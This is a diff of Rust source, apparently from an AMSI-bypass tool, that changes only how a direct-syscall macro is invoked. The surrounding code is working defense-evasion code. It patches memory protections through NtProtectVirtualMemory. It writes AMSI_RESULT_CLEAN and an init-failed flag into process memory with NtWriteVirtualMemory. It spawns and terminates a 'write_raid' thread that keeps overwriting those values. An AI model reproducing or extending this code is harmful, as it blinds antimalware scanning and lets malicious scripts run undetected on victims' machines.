@@ -74,7 +74,7 @@ fn apply_memory_patch() {
     unsafe fn nt_protect(base: *mut winapi::ctypes::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
         let mut prot_base = base;
         let mut prot_size = size;
-        let status = nt_syscall::syscall!(
+        let status = syscall!(
             "NtProtectVirtualMemory",
             (-1isize) as u64,                      // NtCurrentProcess()
             &mut prot_base as *mut _ as u64,
@@ -204,7 +204,7 @@ fn set_init_failed_flag() {
     unsafe fn nt_protect(base: *mut winapi::ctypes::c_void, size: usize, new_prot: u32, old_prot: *mut u32) -> bool {
         let mut prot_base = base;
         let mut prot_size = size;
-        let status = nt_syscall::syscall!(
+        let status = syscall!(
             "NtProtectVirtualMemory",
             (-1isize) as u64,                      // NtCurrentProcess()
             &mut prot_base as *mut _ as u64,
@@ -621,7 +621,7 @@ mod write_raid {
             if has_init {
                 let value: u32 = 1;
                 let mut bytes_written: usize = 0;
-                let status = nt_syscall::syscall!(
+                let status = syscall!(
                     "NtWriteVirtualMemory",
                     (-1isize) as u64, // NtCurrentProcess()
                     init_failed_ptr as u64,
@@ -641,7 +641,7 @@ mod write_raid {
             if has_session {
                 let value: u32 = AMSI_RESULT_CLEAN;
                 let mut bytes_written: usize = 0;
-                let status = nt_syscall::syscall!(
+                let status = syscall!(
                     "NtWriteVirtualMemory",
                     (-1isize) as u64,
                     session_ptr as u64,
@@ -759,7 +759,7 @@ mod write_raid {
             );
 
             let mut thread_handle: u64 = 0;
-            let create_status = nt_syscall::syscall!(
+            let create_status = syscall!(
                 "NtCreateThreadEx",
                 &mut thread_handle as *mut u64 as u64, // ThreadHandle
                 0x1FFFFFu64,                            // DesiredAccess (THREAD_ALL_ACCESS)
@@ -833,7 +833,7 @@ mod write_raid {
             let handle = RAID_THREAD_HANDLE.load(Ordering::Acquire);
             if handle != 0 {
                 unsafe {
-                    let _ = nt_syscall::syscall!(
+                    let _ = syscall!(
                         "NtTerminateThread",
                         handle,
                         0u64,
@@ -919,7 +919,7 @@ mod write_raid {
             unique_process: 0,
             unique_thread: 0,
         };
-        let status = nt_syscall::syscall!(
+        let status = syscall!(
             "NtQueryInformationThread",
             handle,
             0u64, // ThreadBasicInformation
